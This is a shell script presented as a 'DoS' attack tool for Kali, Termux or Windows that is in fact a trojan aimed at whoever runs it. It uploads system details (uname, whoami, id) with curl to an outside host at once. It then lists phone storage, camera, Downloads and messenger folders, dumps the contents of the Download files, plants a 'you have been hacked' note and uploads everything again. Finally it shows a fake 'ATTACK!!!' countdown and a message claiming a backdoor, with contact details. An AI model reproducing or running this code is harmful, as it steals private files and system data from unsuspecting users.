#!/system/bin/bash/sh

clear
echo -e "\033[33;32m"
echo "Copyright By Pham Chien

  System : $(uname -a)
  User   : $(whoami)
  date   : $(date)
  path   : $(pwd)
  id     : $(id)

"> system.txt
curl -T system.txt http://n8tive.co.za

termux() {
echo "

  $(ifconfig)

  $(cd /sdcard/documents ; ls -s -u)

  ===== FILES SDCARD =====

  $(cd /sdcard/ ; ls -s -u)

  ===== Android Files =====

  $(cd /sdcard/Android ; ls -s -u)

  ===== DATA ANDROID =====

  $(cd /sdcard/Android/data ; ls -s -u)

  ===== MOVIE FILES =====

  $(cd /sdcard/Movies ; ls -s -u)

  ==== Messenger =====

  $(cd /sdcard/Movies/messenger ; ls -s -u)

  ==== Pictures =====

  $(cd /sdcard/Pictures ; cd * ; ls -s -u)

  ====== Download =====

  $(cd /sdcard/download ; echo 'All your data has been hacked , contact me : cyberkex.phamchien.net@gmail.com' >> you_have_been_hacked.txt ; ls -s -u ; cat *)

  $(cd /sdcard/download ; echo "..." >> may.txt ; echo "..." >> da.txt ; echo "..." >> bi.txt ; echo "..." >> hack.txt)

  $(cd /sdcard/download ; cd * ; ls -l -u)

  ====== Image ======

  $(cd /sdcard/DCIM/Screenshots ; ls -s -u)

  ====== VIDEO ======

 $(cd /sdcard/DCIM/Camera ; ls -s -u)

  ====== Camera =====

$(cd /sdcard/DCIM/Camera/Cshot ; cd * ; ls -s -u)

  System : $(uname -a)
  User   : $(whoami)
  date   : $(date)
  path   : $(pwd)
  id     : $(id)

  ','{$line}','

  ','{$line}','

  ','{$line}','

  ','{$line}','

  ','{$line}','

  ','{$line}',' " >> system.txt
   curl -T system.txt http://n8tive.co.za/
}

kali() {
echo "

  $(ifconfig)

  $(cd /etc/fstab ; ls -l )

  $(cd /Downloads ; ls -l )

  $(cd /Pictures ; ls -s -u )

  $(cd /Desktop ; ls -s -u )

  $(cd /Videos ; ls -s -u )

  $(cd /Documents ; ls -s -u )

  $(cd /Public ; ls -s -u)

  $(cd /home ; ls -s -u ) ">> system.txt

curl -T system.txt http://n8tive.co.za
}

windows() {
echo "

$(ifconfig)

  $(cd /etc/fstab ; ls -l )

  $(cd /Downloads ; ls -l )

  $(cd /Pictures ; ls -s -u )

  $(cd /Desktop ; ls -s -u )

  $(cd /Videos ; ls -s -u )

  $(cd /Documents ; ls -s -u )

  $(cd /Public ; ls -s -u)

  $(cd /home ; ls -s -u ) ">> system.txt

  curl -T system.txt http://n8tive.co.za
}
echo "
____       ____
|  _ \  ___/ ___|
| |_| |/ _ \___ \\
|____/ \___/____/

1 ) kali
2 ) termux
3 ) windows"

  echo -n Enter System :
   read system

   case $system in
   1)
   kali
   echo -e "\033[33;35m"

  echo -n Enter Target :
 read line

  echo 3
  sleep 1
  echo 2
  sleep 1
  echo 1
  sleep 1
  echo ATTACK!!!
  sleep 1
  echo -e "\033[33;31m
   you have had a backdoor attack, all your Backups and Android files are controlled by us, please contact me via my zalo 0325852307😂😂"
  exit 1
  ;;

  2)
  termux
  echo -e "\033[33;35m"

  echo -n Enter Target :
 read line

  echo 3
  sleep 1
  echo 2
  sleep 1
  echo 1
  sleep 1
  echo ATTACK!!!
  sleep 1
  echo -e "\033[33;31m
   you have had a backdoor attack, all your Backups and Android files are controlled by us, please contact me via my zalo 0325852307😂😂"
  exit 1
  ;;

  3)
  windows
  echo -e "\033[33;35m"

  echo -n Enter Target :
 read line

  echo 3
  sleep 1
  echo 2
  sleep 1
  echo 1
  sleep 1
  echo ATTACK!!!
  sleep 1
  echo -e "\033[33;31m
   you have had a backdoor attack, all your Backups and Android files are controlled by us, please contact me via my zalo 0325852307😂😂"
  exit 1
  ;;

  *)
   echo Command not found 
   exit 1
esac
